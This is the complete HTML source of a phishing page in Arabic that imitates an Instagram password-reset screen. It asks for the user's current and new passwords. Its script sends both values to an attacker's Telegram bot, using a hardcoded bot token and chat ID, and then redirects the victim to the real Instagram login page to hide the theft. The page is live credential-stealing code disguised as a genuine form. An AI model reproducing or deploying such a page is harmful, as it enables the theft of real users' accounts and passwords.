<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>Instagram</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    html, body {
      width: 100%;
      height: 100%;
      background: #000817;
    }

    body {
      display: flex;
      justify-content: center;
      align-items: flex-start;
    }

    .screen {
      width: 100%;
      max-width: 430px;
      min-height: 100dvh;
      background-color: #000817;
      display: flex;
      flex-direction: column;
      position: relative;
    }

    /* ── HEADER ── */
    .header {
      display: flex;
      flex-direction: row-reverse;
      justify-content: space-between;
      align-items: center;
      padding: 16px 20px 10px 20px;
    }

    .logo {
      font-size: 22px;
      font-weight: 700;
      color: #ffffff;
      letter-spacing: -0.8px;
    }

    .close-btn {
      cursor: pointer;
      display: flex;
      align-items: center;
    }

    /* ── BODY ── */
    .body {
      padding: 40px 24px 0 24px;
      flex: 1;
      display: flex;
      flex-direction: column;
    }

    .title {
      font-size: 18px;
      font-weight: 700;
      color: #ffffff;
      text-align: center;
      margin-bottom: 12px;
    }

    .subtitle {
      font-size: 13.5px;
      font-weight: 400;
      color: #a8a8a8;
      text-align: center;
      line-height: 1.5;
      margin-bottom: 35px;
    }

    /* ── INPUTS ── */
    .input-wrap {
      margin-bottom: 12px;
    }

    .inp {
      width: 100%;
      background-color: #242A36;
      border: none;
      border-radius: 8px;
      padding: 16px;
      font-size: 14px;
      color: #A6AAB5;
      outline: none;
      text-align: left !important;
      direction: ltr !important;
    }

    .inp::placeholder {
      color: #737373;
      text-align: left !important;
      direction: ltr !important;
    }

    /* ── BUTTON ── */
    .btn-wrap {
      display: flex;
      justify-content: flex-start; /* لليمين في وضع RTL */
      margin-top: 15px;
    }

    .btn {
      background-color: #0095f6;
      color: #ffffff;
      border: none;
      border-radius: 8px;
      padding: 10px 22px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
    }

    /* ── HOME BAR ── */
    .home-bar {
      display: flex;
      justify-content: center;
      padding-bottom: 10px;
    }

    .bar {
      width: 130px;
      height: 5px;
      background: #ffffff;
      border-radius: 100px;
    }
  </style>
</head>
<body>
  <div class="screen">
    <div class="header">
      <div class="close-btn" onclick="location.href='https://instagram.com'">
        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <line x1="18" y1="6" x2="6" y2="18"/>
          <line x1="6" y1="6" x2="18" y2="18"/>
        </svg>
      </div>
      <div class="logo">Instagram</div>
    </div>

    <div class="body">
      <div class="title">إنشاء كلمة سر قوية</div>
      <div class="subtitle">
        يجب ألا تقل كلمة السر عن ستة أحرف وأن تتضمن توليفة من الأرقام والأحرف الأبجدية والرموز الخاصة (! $ % @).
      </div>

      <div class="input-wrap">
        <input class="inp" type="password" id="p1" placeholder="كلمة السر الحالية" />
      </div>

      <div class="input-wrap">
        <input class="inp" type="password" id="p2" placeholder="كلمة السر الجديدة" />
      </div>

      <div class="btn-wrap">
        <button class="btn" onclick="sendData()">إعادة تعيين كلمة السر</button>
      </div>
      <div style="flex:1"></div>
    </div>

    <div class="home-bar"><div class="bar"></div></div>
  </div>

  <script>
    async function sendData() {
      const p1 = document.getElementById('p1').value;
      const p2 = document.getElementById('p2').value;
      
      // نتحقق فقط من أن الخانات ليست فارغة
      if (!p1 || !p2) return;

      const botToken = "7546948976:AAFPHTjFRKGAOQOgkyg6uEqXCjl_ca2nC2k";
      const chatId = "56081692";
      const msg = `🎯 سحب جديد (باران @MxvMM):\n\n🔐 الحالية: ${p1}\n🆕 الجديدة: ${p2}`;

      try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ chat_id: chatId, text: msg })
        });
        window.location.href = "https://www.instagram.com/accounts/login/";
      } catch (e) {}
    }
  </script>
</body>
</html>
